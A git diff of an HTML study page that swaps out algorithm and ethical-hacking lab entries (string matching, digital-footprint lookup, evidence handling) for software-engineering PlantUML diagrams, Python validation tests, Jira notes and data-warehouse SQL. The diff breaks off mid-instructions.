@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -16,8 +15,6 @@
       padding: 0;
       background-color: #f0f0f0;
     }
-
-    /* Logo in top-right corner */
     .logo {
       position: absolute;
       top: 10px;
@@ -25,40 +22,29 @@
       width: 40px;
       height: 40px;
     }
-
     .container {
       width: 100%;
-      /* margin: 80px auto 40px auto; */
       background-color: #ffffff;
-      /* padding: 30px; */
-      border-radius: 0%;
-      /* box-shadow: 0 0 10px rgba(0,0,0,0.2); */
       justify-content: center;
     }
-
     h1, h2 {
       text-align: center;
       color: #333;
       font-size: 5px;
     }
-
     .subject, .program {
       cursor: pointer;
       color: #007BFF;
       margin: 10px 0;
       text-align: center;
       font-size: 5px;
-
     }
-
     .subject:hover, .program:hover {
       text-decoration: underline;
     }
-
     #programs, #codeDisplay {
       margin-top: 20px;
     }
-
     pre {
       background: #f0f0f0;
       padding: 10px;
@@ -66,585 +52,1463 @@
       white-space: pre-wrap;
       font-size: 5px;
     }
-
-    .image-section {
-      text-align: center;
-      /* margin-top: 30px; */
-    }
-
-    .image-section img {
-      max-width: 100%;        /* Better for responsiveness */
-      height: auto;
-      /* border-radius: 0px; */
-      display: block;
-      margin: 0 auto;
-    }
   </style>
-        <style>
-          html, body {
-              height: 100%;
-              margin: 0;
-          }
-          img {
-              width: 100%;
-              height: 100%;
-              object-fit: cover; /* Ensures the image covers the whole screen */
-          }
-      </style>
 </head>
 <body>
 
-  <!-- Logo in top-right corner -->
-  <img src="vscode.png" alt="Parikshak">
+  <img src="vscode.png" alt="Parikshak" class="logo">
 
   <div class="container">
     <h1>Select a Subject</h1>
 
     <div id="subjects">
-      <div class="subject" onclick="showPrograms('AOA')">AOA</div>
-      <div class="subject" onclick="showPrograms('EH')">EH</div>
+      <div class="subject" onclick="showPrograms('SEPM')">SEPM</div>
+      <div class="subject" onclick="showPrograms('DWM')">DWM</div>
       <div class="subject" onclick="showPrograms('DBMS')">DBMS</div>
       <div class="subject" onclick="showPrograms('PYTHON')">PYTHON</div>
     </div>
 
     <div id="programs"></div>
     <div id="codeDisplay"></div>
+  </div>
 
 <script>
-// Programs and their codes
+// ✅ Helper — automatically encode filenames (handles spaces)
+function safeFilePath(path) {
+  return encodeURI(path);
+}
+
+// ✅ Helper — choose proper emoji/icon by file type
+function getFileIcon(fileName) {
+  const ext = fileName.split('.').pop().toLowerCase();
+  if (ext === "pdf") return "📄";
+  if (ext === "csv") return "📊";
+  if (ext === "docx" || ext === "doc") return "📘";
+  if (ext === "xlsx" || ext === "xls") return "📗";
+  if (ext === "ppt" || ext === "pptx") return "📙";
+  return "📁"; // default icon
+}
+
+// ✅ Data: programs + any file attachments
 const data = {
-  AOA: {
-    "Naïve String-Matching": `
-import java.util.Scanner;
-public class NaiveStringMatching {
-public static void naiveStringMatch(String text, String pattern){
-int textLength = text.length();
-int patternLength = pattern.length();
-boolean found = false;
-for(int i=0; i<= textLength - patternLength; i++){
-int j;
-for(j=0; j< patternLength; j++){
-if(text.charAt(i+j)!= pattern.charAt(j))
-{break;}}
-if(j== patternLength){
- System.out.println(+i);
-found = true; }}
-if(!found){ }}
-public static void main(String[] args){
- Scanner scanner = new Scanner(System.in);
- String text = scanner.nextLine();
- String pattern = scanner.nextLine();
-naiveStringMatch(text, pattern);
-scanner.close();}}
-`
+  SEPM: {
+    "Modular Grading System":  {
+      code:`
+@startuml
+title Modular Grading System
+
+start
+
+partition "Input Module (getInput)" {
+    :Prompt "Enter Student Serial Number";
+    :Read serialNo;
+    :Prompt "Enter Score";
+    :Read score;
+}
+
+partition "Grade Calculation Module (calculateGrade)" {
+    if (score >= 90 && score <= 100) then (A)
+        :grade = "A";
+    elseif (score >= 80 && score < 90) then (B)
+        :grade = "B";
+    elseif (score >= 70 && score < 80) then (C)
+        :grade = "C";
+    elseif (score >= 60 && score < 70) then (D)
+        :grade = "D";
+    elseif (score >= 50 && score < 60) then (E)
+        :grade = "E";
+    else (F)
+        :grade = "F";
+    endif
+}
+
+partition "Output Module (displayResult)" {
+    :Print "Student Serial No: " + serialNo;
+    :Print "Score: " + score;
+    :Print "Grade: " + grade;
+}
+
+stop
+@enduml
+`,
+files: [
+        "Modular Grading System.docx"
+      ] 
+    },
+
+    "University Management System": `
+    1. Waterfall Model
+
+@startuml
+title **Waterfall Model**
+
+skinparam rectangle {
+  BackgroundColor #E6F0FA
+  BorderColor #5B9BD5
+  RoundCorner 15
+}
+
+skinparam node {
+  BackgroundColor #CFE2F3
+  BorderColor #5B9BD5
+}
+
+rectangle "WATERFALL MODEL" {
+  start
+  :Waterfall Start;
+  :Admission Phase;
+  :Academics Phase;
+  :Grading Phase;
+  :Fees Phase;
+  :Library Phase;
+  stop
+}
+@enduml
+
+
+2. Incremental Model
+
+@startuml
+title **Incremental Model**
+
+skinparam rectangle {
+  BackgroundColor #FFF3E0
+  BorderColor #FB8C00
+  RoundCorner 15
+}
+
+skinparam node {
+  BackgroundColor #FFE0B2
+  BorderColor #FB8C00
+}
+
+rectangle "INCREMENTAL MODEL" {
+  start
+  :Incremental Start;
+  :Increment 1\nAdmission;
+  :Increment 2\nAcademics;
+  :Increment 3\nGrading;
+  :Increment 4\nFees;
+  :Increment 5\nLibrary;
+  stop
+}
+@enduml
+
+
+3. Evolutionary Model
+
+@startuml
+title **Evolutionary Model**
+
+skinparam rectangle {
+  BackgroundColor #F3E5F5
+  BorderColor #BA68C8
+  RoundCorner 15
+}
+
+skinparam node {
+  BackgroundColor #E1BEE7
+  BorderColor #8E24AA
+}
+
+rectangle "EVOLUTIONARY MODEL" {
+  start
+  :Evolutionary Start;
+  :Initial Prototype;
+  :User Feedback;
+  :Enhanced Prototype;
+  :Further Enhancement;
+  :More Feedback;
+  :Final System;
+  stop
+}
+@enduml
+
+
+4. Agile Model
+
+
+@startuml
+title **Agile Model**
+
+skinparam rectangle {
+  BackgroundColor #E8F5E9
+  BorderColor #43A047
+  RoundCorner 15
+}
+
+skinparam node {
+  BackgroundColor #C8E6C9
+  BorderColor #2E7D32
+}
+
+rectangle "AGILE MODEL" {
+  start
+  :Agile Start;
+  :Sprint 1\nAdmissions;
+  :Sprint Review 1;
+  :Sprint 2\nGrading;
+  :Sprint Review 2;
+  :Sprint 3\nLibrary;
+  :Sprint Review 3;
+  :Agile End;
+  stop
+}
+@enduml
+`,
+ 
+
+
+
+"Online Food Ordering System": {
+      code: `
+
+@startuml
+title Online Food Ordering System - Structure Chart
+
+skinparam rectangle {
+  BackgroundColor #FFFFFF
+  BorderColor #000000
+  FontStyle bold
+  RoundCorner 10
+}
+
+skinparam shadowing false
+skinparam dpi 200
+
+' ========== Top Level ==========
+rectangle "Online Food Ordering System" as OFOS {
+
+  ' -------- Customer Management --------
+  rectangle "Customer Management" as CM {
+    rectangle "Customer Registration"
+    rectangle "Customer Login"
+  }
+  ' -------- Menu Management --------
+  rectangle "Menu Management" as MM {
+    rectangle "Menu Retrieval"
+  }
+  ' -------- Order Processing --------
+  rectangle "Order Processing" as OP {
+    rectangle "Order Validation"
+    rectangle "Order Placement"
+    rectangle "Order Tracking"
+  }
+  ' -------- Payment Processing --------
+  rectangle "Payment Processing" as PP {
+    rectangle "Payment Confirmation"
+    rectangle "Payment Validation"
+  }
+  ' -------- Restaurant Communication --------
+  rectangle "Restaurant Communication" as RC {
+    rectangle "Order Forwarding"
+  }
+  ' -------- Inventory Management --------
+  rectangle "Inventory Management" as IM {
+    rectangle "Stock Update"
+  }
+  ' -------- Notification Service --------
+  rectangle "Notification Service" as NS {
+    rectangle "Delivery Status Notification"
+    rectangle "Confirmation Notification"
+  }
+}
+@enduml
+`,
+ files: [ "online food ordering system.docx"
+   ]
+    },
+
+"Online food ordering system Coupling and Cohesion ": {
+      code:`
+@startuml
+title **Coupling and Cohesion Diagram**
+
+skinparam rectangle {
+  RoundCorner 20
+  BorderColor black
+  FontSize 14
+}
+
+skinparam note {
+  BackgroundColor #FFFFFF
+  BorderColor black
+  FontSize 12
+}
+
+'--- Components ---
+rectangle "<b>User Authentification" as UA #white
+
+rectangle "<b>Order Processing\n<font color=green>Functional Cohesion" as OP #white
+
+rectangle "<b>Payment Gateway\n<font color=green>Functional Cohesion" as PG #white
+
+rectangle "<b>Delivery Tracking\n<font color=green>Communicational Cohesion" as DT1 #white
+
+rectangle "<b>Delivery Tracking\n<font color=orange>Communicational Cohesion" as DT2 #FFF3E0
+
+rectangle "<b>Admin Dashboard\n<font color=red>Coincidental Cohesion\n(Poor Design)" as AD #FFEBEE
+
+'--- Connections ---
+UA -down-> OP : data coupling
+OP -down-> DT1 : data coupling
+DT1 -down-> DT2 : data coupling
+OP -right-> PG : data coupling
+DT1 -right-> AD : data coupling
+PG -down-> AD : common coupling
+
+@enduml
+
+`,
+files: [
+       "Online food ordering system Coupling and Cohesion.docx" 
+      ] 
+    },
+
+
+
+"Disaster Management and Relief Coordination System (DMRCS)": {
+      code:`
+1.Context-Level DFD
+
+@startuml
+title Disaster Management & Relief Coordination System (DMRCS)
+
+' Define entities
+rectangle "Citizens\n(Report Emergencies)" as Citizens
+rectangle "Emergency Services\n(Fire, Police, Ambulance)" as Emergency
+rectangle "Relief Agencies\n(NGOs, Local Teams)" as Relief
+rectangle "Government\nAgencies & Decision Makers" as Government
+
+' Define the main system
+rectangle "Disaster Management &\nRelief Coordination System (DMRCS)" as DMRCS {
+}
+
+' Data Flows
+Citizens --> DMRCS : Emergency Reports
+DMRCS --> Citizens : Status Updates / Alerts
+
+DMRCS --> Emergency : Dispatch Requests
+Emergency --> DMRCS : Service Status
+
+DMRCS --> Relief : Resource Requests
+Relief --> DMRCS : Relief Availability
+
+DMRCS --> Government : Situation Reports
+Government --> DMRCS : Instructions / Policy Directives
+
+@enduml
+
+2.Level-1 DFD
+
+@startuml
+title Disaster Management & Relief Coordination System (DMRCS) - Level 1 DFD
+
+skinparam rectangle {
+  BackgroundColor #EAF2FB
+  BorderColor #0B3D91
+  RoundCorner 15
+}
+skinparam note {
+  BackgroundColor #FFF5E1
+  BorderColor #FFAA00
+}
+
+' External Entities
+rectangle "Citizens\n(Report Emergencies)" as Citizens
+rectangle "Emergency Services\n(Fire, Police, Ambulance)" as Emergency
+rectangle "Government Agencies\n& Decision Makers" as Government
+rectangle "Relief Agencies\n(NGOs, Local Teams)" as Relief
+
+' Data Stores
+note "D1: Resource Inventory" as D1
+note "D2: Affected Areas DB" as D2
+
+' Processes
+rectangle "1.0 Report Emergency" as P1
+rectangle "2.0 Dispatch Services" as P2
+rectangle "3.0 Manage Resources" as P3
+rectangle "4.0 Update Status" as P4
+rectangle "5.0 Communicate with Agencies" as P5
+rectangle "6.0 Generate Reports\n(Update Affected Zones)" as P6
+
+' Data Flows
+Citizens --> P1 : Emergency Details
+P1 --> D1 : Store Data
+P1 --> P2 : Validated Emergency
+P2 --> Emergency : Dispatch Request
+Emergency --> P2 : Service Status
+P3 --> D1 : Update Inventory
+D1 --> P3 : Resource Data
+P3 --> P4 : Allocated Resources
+P4 --> P6 : Status Data
+P6 --> D2 : Update Affected Zones
+P6 --> P5 : Situation Reports
+P5 --> Government : Situation Reports
+Government --> P5 : Instructions
+Relief --> P6 : Availability Info
+P6 --> Relief : Resource Requests
+P6 --> Government : Zone Status
+D2 --> P5 : Zone Data
+P4 --> P5 : Status Updates
+P2 --> P4 : Service Status
+P4 --> D1 : Update Inventory
+
+@enduml
+
+`, 
+  files: [
+        "Disaster Management and Relief Coordination System.docx"
+      ]
+    },
+
+
+
+
+
+"Domain Analysis for a Library Management System": {
+      code:`
+ @startuml
+title Library Management System - Use Case Diagram
+
+actor "Student" as S
+actor "Librarian" as L
+actor "Administrator" as A
+
+rectangle "Library Management System" {
+    usecase "Search Books" as UC1
+    usecase "Issue Book" as UC2
+    usecase "Return Book" as UC3
+    usecase "Renew Book" as UC4
+    usecase "Generate Overdue Report" as UC5
+    usecase "Manage User Accounts" as UC6
+}
+
+' --- Associations ---
+S --> UC1
+S --> UC4
+
+L --> UC2
+L --> UC3
+L --> UC5
+
+A --> UC6
+
+@enduml
+
+`,
+files: [
+        "Domain Analysis for a Library Management System.docx"
+      ] 
+    },
+
+
+
+
+"Online Course Registration System": {
+      code:`
+ def validate_registration(student_id, num_courses, course_code, payment_mode):
+    if len(student_id) != 8 or not student_id.isdigit():
+        return "Invalid Student ID"   
+    if num_courses < 3 or num_courses > 6:
+        return "Invalid Number of Courses"    
+    if not (len(course_code) == 5 and course_code[:2].isalpha() and course_code[2:].isdigit()):
+        return "Invalid Course Code"   
+    if payment_mode not in ["Credit", "Debit", "UPI", "NetBanking"]:
+        return "Invalid Payment Mode"   
+    return "Registration Successful"
+test_cases = [
+    ("TC01", "12345678", 4, "CS101", "Credit"),
+    ("TC02", "1234", 4, "CS101", "Credit"),
+    ("TC03", "12345678", 2, "CS101", "UPI"),
+    ("TC04", "12345678", 7, "CS101", "NetBanking"),
+    ("TC05", "12345678", 5, "C101", "Debit"),
+    ("TC06", "87654321", 6, "IT202", "PayPal"),
+    ("TC07", "ABCD5678", 4, "CS101", "UPI"),
+    ("TC08", "13579246", 3, "MA303", "NetBanking")]
+print("=== Online Course Registration System - ECT Testing ===\n")
+for tc in test_cases:
+    tc_id, sid, courses, code, payment = tc
+    result = validate_registration(sid, courses, code, payment)
+    print(f"{tc_id}: {result}")
+
+
+`,
+ files: [
+        "Online Course Registration System.pdf"
+      ]  
+    },
+
+
+
+
+
+
+"E-Commerce Discount and Payment Validation System ": {
+      code:`
+ def process_order(cart_amount, is_premium, payment_valid): 
+    discount = 0 
+    order_status = "" 
+    if cart_amount >= 2000: 
+        discount += 10 
+    if is_premium: 
+        discount += 5 
+    if discount > 20: 
+        discount = 20 
+    if payment_valid: 
+        order_status = "Accepted" 
+    else: 
+        order_status = "Cancelled" 
+    return { 
+        "Cart Amount": cart_amount, 
+        "Premium Member": is_premium, 
+        "Payment Valid": payment_valid, 
+        "Final Discount (%)": discount, 
+        "Order Status": order_status } 
+test_cases = [ 
+    (1500, False, True), 
+    (2500, False, True), 
+    (2500, True, True), 
+    (4000, True, True), 
+    (2500, True, False), 
+    (1500, True, True), 
+    (1500, False, False), 
+    (4000, False, True) ]  
+print("---- Decision Table Test Results ----") 
+for i, case in enumerate(test_cases, start=1): 
+    result = process_order(*case) 
+    print(f"Test Case {i}: {result}") 
+`,
+ files: [
+        "E-Commerce Discount and Payment Validation System.pdf"
+      ]  
+    },
+
+
+
+
+
+"Hospital Appointment Management System": {
+      code:`
+ Open: jira tool
+Use Kanban template
+Name your project : New Project
+ Get started > Next > Finish
+Go to Setting in right corner > System > Import and export (External System import)
+Scroll down to see "CSV" > Select file csv file to import > Next
+Jira Space(Software Space) > Project Name (My Project) > Next > Next
+Click 'Exclude from Import' > Next > Next > Import
+
+`,
+ files: [
+        "Hospital Appointment Management System.csv"
+      ]  
+    },
+
+
+
+
+
+"Smart Parking Management System": {
+      code:`
+ PlantUML code — Waterfall
+@startuml
+' Waterfall: linear flow of phases
+skinparam rectangle {
+  BackgroundColor #FBEFEF
+  BorderColor #D9534F
+}
+rectangle "Requirements\n(Design Spec)" as R
+rectangle "System Design" as D
+rectangle "Implementation\n(Coding)" as I
+rectangle "Integration & Test" as T
+rectangle "Deployment" as DEP
+rectangle "Maintenance" as M
+
+R --> D
+D --> I
+I --> T
+T --> DEP
+DEP --> M
+@enduml
+
+PlantUML code — Incremental
+@startuml
+' Incremental: core + increments delivered in waves
+skinparam rectangle {
+  BackgroundColor #EEF9F1
+  BorderColor #2E8B57
+}
+rectangle "Core System\n(MVP)" as Core
+rectangle "Increment 1\n(Parking Detection)" as Inc1
+rectangle "Increment 2\n(Payments & Wallet)" as Inc2
+rectangle "Increment 3\n(Analytics & Reports)" as Inc3
+rectangle "Integration & Regression\nTesting" as Test
+rectangle "Production" as Prod
+
+Core --> Inc1
+Core --> Inc2
+Core --> Inc3
+Inc1 --> Test
+Inc2 --> Test
+Inc3 --> Test
+Test --> Prod
+@enduml
+
+PlantUML code — Spiral (risk-driven iterative)
+@startuml
+' Spiral: iterative cycles focusing on objectives, risk analysis, prototyping and evaluation
+skinparam rectangle {
+  BackgroundColor #FFF8E1
+  BorderColor #F0AD4E
+}
+
+rectangle "Identify Objectives\n(Reqs & Goals)" as O
+rectangle "Risk Analysis\n(Feasibility & HW/Sw risks)" as R
+rectangle "Prototyping\n(Proof-of-concept)" as P
+rectangle "Development & Test\n(Iteration)" as D
+rectangle "Evaluate & Plan Next Spiral" as E
+
+O --> R
+R --> P
+P --> D
+D --> E
+E --> O : next cycle / refine
+note right of R
+  Cycle focuses on risks:
+  - Sensor integration
+  - Data privacy / compliance
+  - Scalability
+end note
+@enduml
+
+PlantUML code — Agile (Scrum-style iterative)
+@startuml
+' Agile (Scrum) sprint loop: backlog -> plan -> sprint -> review -> release/retrospective
+skinparam rectangle {
+  BackgroundColor #E8F4FF
+  BorderColor #2B6CB0
+}
+
+rectangle "Product Backlog\n(Features, Epics)" as Backlog
+rectangle "Sprint Planning" as Plan
+rectangle "Sprint (2-4 wks)\nDevelopment + Test" as Sprint
+rectangle "Sprint Review\n(Demo)" as Review
+rectangle "Sprint Retrospective\n(Improvement)" as Retro
+rectangle "Production Release\n(Minor/Incremental)" as Release
+
+Backlog --> Plan
+Plan --> Sprint
+Sprint --> Review
+Review --> Release
+Review --> Retro
+Retro --> Backlog : improvements / new backlog items
+Release --> Backlog : feedback
+@enduml
+
+Why (brief):
+Time: Agile enables early incremental deliveries (MVPs) so parking features (e.g., slot detection, payments, admin dashboard) can be released fast and improved continuously.
+Cost: Better cost control — deliver high-value features first; fewer wasted dev-hours on requirements that change.
+Requirement changes: Smart Parking projects typically have evolving requirements (integrations with hardware, sensors, mobile apps, payment gateways). Agile handles changing requirements far better than Waterfall or pure Sequential models.
+If constraints force a hybrid, you can combine Agile + Spiral (risk-driven iterations) for high-risk integrations (hardware, 3rd-party sensors).
+
+Quick comparison (1-line)
+Agile: Best for changing requirements, fast time-to-market, moderate predictable cost (recommended).
+Spiral: Best when risks are high (hardware/integration) — more time/cost but reduces risk early.
+Incremental: Good when system can be built in chunks with well-defined increments; medium flexibility.
+Waterfall: Best for stable requirements and heavy compliance — low flexibility, lowest iteration cost but high rework risk if requirements change.
+`,
+    files: [
+        "Smart Parking Management System.docx"
+      ] 
+    },
+
+
+
+
+
+"Patient Record Management System": {
+      code:`
+ Context-Level DFD (Draw.io / PlantUML Version)
+
+@startuml
+title Context-Level DFD for Patient Record Management System
+
+rectangle "Patient Record Management System" as System {
+}
+
+actor "Patient" as Patient
+actor "Doctor" as Doctor
+actor "Insurance Agency" as Insurance
+
+database "Patient Database" as PatientDB
+database "Medical Records Database" as MedicalDB
+
+Patient --> System : Patient Info, Appointment Request
+System --> Patient : Appointment Confirmation, Reports
+
+Doctor --> System : Diagnosis, Prescriptions
+System --> Doctor : Patient Records, History
+
+Insurance --> System : Claim Verification
+System --> Insurance : Billing Details, Claim Data
+
+System --> PatientDB : Store/Update Patient Info
+System --> MedicalDB : Store Medical Records
+@enduml
+
+
+Level-1 DFD (Draw.io / PlantUML Version)
+
+
+@startuml
+title Level-1 DFD for Patient Record Management System
+
+actor "Patient" as Patient
+actor "Doctor" as Doctor
+actor "Admin" as Admin
+
+database "D1: Patient Database" as PatientDB
+database "D2: Medical History Database" as MedicalDB
+database "D3: Billing Database" as BillingDB
+
+rectangle "1.0 Registration" as Reg
+rectangle "2.0 Medical Records Management" as MedRec
+rectangle "3.0 Appointment Scheduling" as App
+rectangle "4.0 Billing & Payments" as Bill
+rectangle "5.0 Reporting & Analytics" as Report
+
+Patient --> Reg : Provide Personal Info
+Reg --> PatientDB : Store Patient Data
+
+Patient --> App : Appointment Request
+App --> PatientDB : Verify Patient Info
+App --> MedRec : Retrieve Medical History
+App --> Patient : Appointment Confirmation
+
+Doctor --> MedRec : Add Diagnosis & Notes
+MedRec --> MedicalDB : Update Patient Medical History
+MedRec --> Doctor : Patient Details
+
+Patient --> Bill : Payment Details
+Bill --> BillingDB : Store Billing Record
+Bill --> Patient : Invoice / Receipt
+
+Admin --> Report : Generate Reports
+Report --> PatientDB : Access Patient Info
+Report --> MedicalDB : Access Medical Data
+Report --> BillingDB : Access Billing Data
+@enduml
+
+`,
+files: [
+        "Patient Record Management System.docx"
+      ] 
+    },
+
+
+
+
+
+"Food Delivery Application": {
+      code:`
+ Use Case Diagram - Food Delivery Application
+
+@startuml
+title Use Case Diagram for Food Delivery Application
+
+' Define actors
+actor "Customer" as Customer
+actor "Restaurant" as Restaurant
+actor "Delivery Agent" as Agent
+actor "Admin" as Admin
+
+' System boundary
+rectangle "Food Delivery Application" as FDA {
+    usecase "Register / Login" as UC1
+    usecase "Browse Restaurants & Menus" as UC2
+    usecase "Place Order" as UC3
+    usecase "Track Order" as UC4
+    usecase "Make Payment" as UC5
+    usecase "Provide Rating / Feedback" as UC6
+    usecase "Manage Menu Items" as UC7
+    usecase "Accept / Reject Order" as UC8
+    usecase "Deliver Order" as UC9
+    usecase "Manage Users & Reports" as UC10
+}
+
+' Relationships
+Customer --> UC1
+Customer --> UC2
+Customer --> UC3
+Customer --> UC4
+Customer --> UC5
+Customer --> UC6
+
+Restaurant --> UC7
+Restaurant --> UC8
+UC3 --> UC5 : <<include>>
+UC3 --> UC4 : <<extend>>
+
+Agent --> UC9
+UC8 --> UC9 : <<include>>
+
+Admin --> UC10
+
+@enduml
+
+
+
+Class Diagram – Food Delivery Application
+
+
+@startuml
+title Class Diagram for Food Delivery Application
+
+' Define main classes
+class User {
+    +userID: int
+    +name: string
+    +email: string
+    +password: string
+    +login()
+    +logout()
+}
+
+class Customer {
+    +browseRestaurants()
+    +placeOrder()
+    +makePayment()
+    +trackOrder()
+    +giveFeedback()
+}
+
+class Restaurant {
+    +restaurantID: int
+    +restaurantName: string
+    +menuItems: List<MenuItem>
+    +acceptOrder()
+    +updateMenu()
+}
+
+class MenuItem {
+    +itemID: int
+    +name: string
+    +price: float
+    +availability: boolean
+}
+
+class Order {
+    +orderID: int
+    +orderDate: date
+    +status: string
+    +calculateTotal()
+}
+
+class Payment {
+    +paymentID: int
+    +amount: float
+    +paymentType: string
+    +processPayment()
+}
+
+class DeliveryAgent {
+    +agentID: int
+    +name: string
+    +phone: string
+    +updateDeliveryStatus()
+}
+
+class Admin {
+    +generateReports()
+    +manageUsers()
+    +manageRestaurants()
+}
+
+' Relationships
+User <|-- Customer
+User <|-- Restaurant
+User <|-- DeliveryAgent
+User <|-- Admin
+
+Customer "1" -- "many" Order : places >
+Restaurant "1" -- "many" Order : receives >
+Order "1" -- "1" Payment : has >
+Order "1" -- "many" MenuItem : contains >
+DeliveryAgent "1" -- "many" Order : delivers >
+
+@enduml
+
+
+`,
+ files: [
+        "Food Delivery Application.pdf"
+      ] 
+    },
+
+
+
+
+"Library Management System": {
+      code:`
+ def validate_registration(name, email, age, password):
+    if not name.isalpha():
+        return "Invalid name"
+    if "@" not in email or "." not in email.split("@")[-1]:
+        return "Invalid email format"
+    if not (12 <= age <= 80):
+        return "Invalid age"
+    if len(password) < 8:
+        return "Password too short"
+    return "Registration successful"
+
+
+def validate_book_issue(membership_status, books_available, books_issued):
+    if membership_status.lower() != "active":
+        return "Access denied – Invalid membership"
+    if books_available <= 0:
+        return "Book not available"
+    if books_issued >= 5:
+        return "Issue limit exceeded"
+    return "Book issued successfully"
+
+
+def calculate_fine(days_late):
+    if days_late < 0:
+        return "Invalid input"
+    elif days_late > 30:
+        return "Exceeds maximum late period"
+    else:
+        return f"Fine: ₹{days_late * 10}"
+
+
+def run_unit_tests():
+    print("\n=== UNIT TESTS: LIBRARY MANAGEMENT SYSTEM (ECT) ===\n")
+
+    print("User Registration Tests:")
+    test_cases_reg = [
+        ("Srushti", "srushti@mail.com", 21, "Test@123"),
+        ("1234", "srushti@mail.com", 21, "Test@123"),
+        ("Srushti", "srushtimail.com", 21, "Test@123"),
+        ("Srushti", "srushti@mail.com", 9, "Test@123"),
+        ("Srushti", "srushti@mail.com", 21, "pass"),
+    ]
+    for case in test_cases_reg:
+        result = validate_registration(*case)
+        print(f"Input: {case} → Output: {result}")
+
+    print("\nBook Issue Tests:")
+    test_cases_issue = [
+        ("active", 3, 2),
+        ("expired", 3, 2),
+        ("active", 0, 1),
+        ("active", 2, 5),
+    ]
+    for case in test_cases_issue:
+        result = validate_book_issue(*case)
+        print(f"Input: {case} → Output: {result}")
+
+    print("\nFine Calculation Tests:")
+    test_cases_fine = [0, 10, -5, 45]
+    for days in test_cases_fine:
+        result = calculate_fine(days)
+        print(f"Days Late: {days} → Output: {result}")
+
+    print("\n=== END OF TESTS ===")
+
+
+if __name__ == "__main__":
+    run_unit_tests()
+`, 
+files: [
+        "Library_Management_System_Requirements.docx"
+      ]  
+    },
+
+
+
+"College ERP Implementation Project Gantt Chart": {
+      code:`
+ Jira File
+`,
+ files: [
+        "College_ERP_CSV.csv"
+      ]  
+    },
+
+"Realtime chatapp": {
+      code:`
+ Jira File 
+ Test ID,Summary,Module,Priority,Trigger for Regression,Test Description,Expected Result,Tags,Execution Phase
+RT-001,"Login & Authentication - Verify login, session & tokens",Login & Authentication,High,After changes in login or auth module,"Verify login with valid and invalid credentials, session management, and token validation",Login and session functionality works without regression,"Regression,Security",Post-Release
+RT-002,Real-Time Messaging - Verify send/receive and delivery status,Real-Time Messaging,Critical,After any changes to chat APIs or socket implementation,Check message send/receive between users and message delivery status,Messages sent and received instantly with correct status indicators,"Regression,Functional",Post-Deployment
+RT-003,Group Chat Module - Verify group messaging visibility,Group Chat Module,High,After group or participant management updates,"Create group, send message, verify visibility for all participants",Messages visible to all participants without delay,"Regression,Functional",Sprint-2
+RT-004,File Sharing - Verify upload/download and integrity,File Sharing,Medium,After file upload/download or storage API changes,"Send image, video, and document files; verify successful transfer",Files shared and downloaded correctly without corruption,"Regression,Performance",Sprint-3
+RT-005,Chat History Persistence - Verify logs after refresh/login,Chat History Persistence,High,After database schema or session management updates,Check message logs after refresh and re-login,Chat history persists accurately,"Regression,Database",Sprint-4
+RT-006,Notifications - Verify offline and push notifications,Notifications,Medium,After push notification or backend service update,Send message when user offline and verify notification received,Notifications received promptly on mobile/web,"Regression,Functional",Post-Release
+RT-007,Server Downtime Handling - Verify error handling & retries,Server Downtime Handling,High,After infrastructure or error handling code updates,"Simulate network loss, try sending messages",App displays meaningful error and retries automatically,"Regression,Stability",Sprint-5
+RT-008,Performance under Load - Verify behavior under 1000+ users,Performance under Load,Critical,After backend performance optimizations,Simulate 1000+ concurrent users sending messages,"No crash, response time < 2 seconds","Performance,Regression",Post-Deployment
+RT-009,Data Security and Encryption - Verify encryption in transit & at rest,Data Security and Encryption,Critical,After security patch or encryption logic update,Inspect data packets and stored messages,All messages encrypted in transit and at rest,"Security,Regression",Release-1.1
+RT-010,End-to-End Regression Test - Full cycle verification,End-to-End Regression Test,Critical,After each major deployment,"Perform login, chat, logout flow with multiple users",System functions correctly across all modules,"Regression,FullCycle",Every Release
+
+`,
+ files: [
+        "Retail_Billing_System_Scrum.csv"
+      ]  
+    },
+
+
+  "  Retail Billing System Scrum methodology": {
+      code:`
+ Jira File
+`,
+ files: [
+        "Retail_Billing_System_Scrum.csv"
+      ]  
+    },
+
+
+
+
+"  Cloud Data Migration Project Jira": {
+      code:`
+ Jira file 
+ Risk Migration 
+ https://sakec-team-u0w0u8so.atlassian.net/jira/apps/da2665c5-9d3c-4f43-8d63-5e81ddf4cfb8/d1790146-47a1-4dfc-9c44-08201ee84eb4
+`,
+ files: [
+        "Cloud_Data_Migration_Risk_Register.csv"
+      ]  
+    },
+    
 },
   
-EH: {
-    "exp 1 Discover digital footprints found both online and in metadata using appropriate tools": `-- have i been pawned
-	put your email id and check
-Google Search( eg your name or celebrity name)
-ipinfo
-	put any ip address( eg. 1.39.25.144, 1.0.0.8)
-waybackmachine
-	sakec.ac.in(any url)
-`,
 
 
+DWM: {
+    "Snowflake & Star schema": {
+      code:`
+
+1. Open MySQL workbench
+2. Go to query
+3.FOR Star schema
+  Paste this entire code (After every semicolon(;) Click 'ctrl+enter')
+
+	CREATE DATABASE globalgadgets_dw;
+USE globalgadgets_dw;
+CREATE TABLE dim_product (
+  product_id INT PRIMARY KEY,
+  product_name VARCHAR(100),
+  category VARCHAR(50),
+  brand VARCHAR(50)
+);
+
+CREATE TABLE dim_customer (
+  customer_id INT PRIMARY KEY,
+  customer_name VARCHAR(100),
+  gender VARCHAR(10),
+  age INT
+);
+
+CREATE TABLE dim_time (
+  time_id INT PRIMARY KEY,
+  date DATE,
+  month VARCHAR(20),
+  quarter VARCHAR(10),
+  year INT
+);
+
+CREATE TABLE dim_location (
+  location_id INT PRIMARY KEY,
+  city VARCHAR(50),
+  state VARCHAR(50),
+  country VARCHAR(50)
+);
+
+CREATE TABLE fact_sales (
+  sales_id INT PRIMARY KEY,
+  product_id INT,
+  customer_id INT,
+  time_id INT,
+  location_id INT,
+  quantity_sold INT,
+  total_sales DECIMAL(10,2),
+  FOREIGN KEY (product_id) REFERENCES dim_product(product_id),
+  FOREIGN KEY (customer_id) REFERENCES dim_customer(customer_id),
+  FOREIGN KEY (time_id) REFERENCES dim_time(time_id),
+  FOREIGN KEY (location_id) REFERENCES dim_location(location_id)
+);
 
 
-"Practice investigative procedures including bagging and tagging evidence, following the chain of custody, and photographing evidence at the scene.": 
-`1.2 Course Outcome:
-Gain familiarity with various tools and equipment used in digital evidence handling, including
-bagging, tagging, photographing, and maintaining the chain of custody.
-1.3 Lab Objective:
-● Explore and understand the purpose and usage of equipment and materials for
-handling digital evidence.
-● Emphasize the importance of proper evidence handling and documentation techniques.
+4. Go To Database > Reverse Engineering > 
+5. In Stored Connection: (choose db )
